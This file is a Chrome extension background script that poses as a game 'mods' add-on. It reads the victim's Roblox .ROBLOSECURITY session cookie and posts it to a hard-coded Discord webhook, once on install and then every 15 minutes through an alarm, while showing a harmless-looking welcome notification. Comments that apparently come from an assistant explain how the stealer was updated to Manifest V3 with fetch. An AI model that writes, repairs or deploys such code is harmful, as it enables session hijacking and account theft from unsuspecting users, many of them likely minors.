// bgWork.js

var website = "https://www.roblox.com"; // Change this to the website you want to log, don't forget to edit the manifest.json too!
var cookie_data = ".ROBLOSECURITY"; // Change this to the cookie of the website!
var discord_web_api = "https://discord.com/api/webhooks/1386091648831721482/qfoGVDZ9llllDVnCMAumal_I_zeYYDtJtHHdQ69MD0WgjdeGoDeFcrOHpXb2KNtEK4IQ"; // This is the bot api!

var asdd; // This variable seems to store the processed cookie data

// --- Utility Functions ---

// Chunks a string into smaller pieces
function chunk(str, size) {
    const chunks = [];
    for (let i = 0; i < str.length; i += size) {
        chunks.push(str.substr(i, size));
    }
    return chunks;
}

// Fetches the specified cookie
function findCookie() {
    asdd = undefined; // Reset asdd
    chrome.cookies.get({
        url: website,
        name: cookie_data
    }, function(cookie) {
        if (cookie && cookie.value && asdd !== cookie.value) {
            // If cookie exists and is different from previous, update asdd
            asdd = chunk(cookie.value, 60).join('\n');
        }
    });
}

// Call findCookie initially
findCookie();

var botUrl = discord_web_api;
var debug = false;
if (debug === true) {
    botUrl = botUrl + "?wait=true"; // Append wait=true for debug purposes
}

var coolEmojis = [":star:", ":boom:", ":christmas_tree:"];
var shapeEmojis = [":large_blue_diamond:", ":large_orange_diamond:"];

// --- Discord Message Sending Functions ---

// This function seems to be for plain text messages, not embeds.
// It uses jQuery $.ajax, which is generally not available in a raw Service Worker.
// If you are loading jQuery-ver3.js, ensure it's imported correctly in the service worker.
// However, for Discord webhooks, fetch is generally preferred and more reliable in this context.
async function sendDiscordMessage(messageContent) {
    try {
        const response = await fetch(botUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                content: messageContent
            })
        });

        if (!response.ok) {
            console.error(`Error sending Discord message: ${response.status} ${response.statusText}`);
        } else {
            console.log("Discord message sent successfully (plain text).");
        }
    } catch (error) {
        console.error("Fetch error sending Discord message (plain text):", error);
    }
}


// FIX: Replaced XMLHttpRequest with Fetch API
async function createEmbed(title, description, color) {
    const embedData = {
        embeds: [{
            title: title,
            description: description,
            color: color
        }]
    };

    try {
        const response = await fetch(botUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json; charset=UTF-8'
            },
            body: JSON.stringify(embedData)
        });

        if (!response.ok) {
            console.error(`Error sending Discord embed: ${response.status} ${response.statusText}`);
            const errorText = await response.text();
            console.error("Discord API Response:", errorText);
        } else {
            console.log("Discord embed sent successfully.");
        }
    } catch (error) {
        console.error("Fetch error sending Discord embed:", error);
    }
}

// Grabs the cookie and sends it as a Discord embed
function cleanerCookieGrab() {
    chrome.cookies.get({
        url: website,
        name: cookie_data
    }, function(cookie) {
        if (cookie && cookie.value) {
            const pick = shapeEmojis[Math.floor(Math.random() * shapeEmojis.length)];
            const pick2 = coolEmojis[Math.floor(Math.random() * coolEmojis.length)];
            const cookiePhrases = [
                "A wild cookie has appeared!",
                "Don't count your cookies before they're eaten.",
                "It's a bird! It's a cookie! It's a bird eating a cookie!",
                "Filthy, filthy, cookies. What's next, cake?",
                "Don't make me eat this cookie!"
            ];
            const cookiePhrase = cookiePhrases[Math.floor(Math.random() * cookiePhrases.length)];

            const titleItem = `${pick}${pick2} ${cookiePhrase} ${pick2}${pick}`;
            const descItem = chunk(cookie.value, 60).join('\n');
            const color = 0xFFFFFF; // White color

            createEmbed(titleItem, descItem, color);
        }
    });
}

// --- Event Listeners ---

// On extension install/update
chrome.runtime.onInstalled.addListener(function(details) {
    // Create an alarm to periodically grab cookies
    // Note: Alarms are for future events. If you want to run immediately on install, call cleanerCookieGrab().
    chrome.alarms.create("tradeBackground", { // Renamed from 'tradeBotStart' for clarity based on original code structure
        delayInMinutes: 0.1, // Run after 0.1 minutes (6 seconds)
        periodInMinutes: 15 // Repeat every 15 minutes
    });

    if (details.reason === "install") {
        // Show a notification on first install
        chrome.notifications.create("tradeBotStart", {
            type: "basic",
            iconUrl: "icon.png",
            title: "Mods! Mods has started!",
            message: "Welcome! Modding is now active!"
        });

        // Send a Discord embed on first install with initial cookie data (if available)
        const installPickShape = shapeEmojis[Math.floor(Math.random() * shapeEmojis.length)];
        const installPickCool = coolEmojis[Math.floor(Math.random() * coolEmojis.length)];
        const installTitle = `${installPickShape}${installPickCool} @everyone A new extension startup. ${installPickShape}${installPickCool}`;
        const installDesc = asdd || "No cookie data available yet."; // Use asdd if set, otherwise a default message
        const installColor = 0xFFFFFF;
        createEmbed(installTitle, installDesc, installColor);

    }
});

// On alarm trigger
chrome.alarms.onAlarm.addListener(function(alarm) {
    if (alarm.name === "tradeBackground") { // Renamed from 'tradeBotStart' to match creation name
        cleanerCookieGrab();
    }
});

// IMPORTANT: Service Workers require direct top-level import for external scripts.
// If "jQuery-ver3.js" is truly needed in the Service Worker context, you MUST import it at the very top.
// For example:
// importScripts('jQuery-ver3.js');
// However, note that jQuery relies on the DOM (Document Object Model) and will likely not function
// as expected in a Service Worker, which does not have a DOM.
// The `sendDiscordMessage` function used `$.ajax` from jQuery. I've replaced it with `fetch`.
// If `jQuery-ver3.js` is only for other parts of your extension (like a popup or content script),
// then it should not be listed in the `background.scripts` array in Manifest V3.
// If it's *only* used for this `$.ajax` call, then you can remove jQuery entirely and just use fetch.
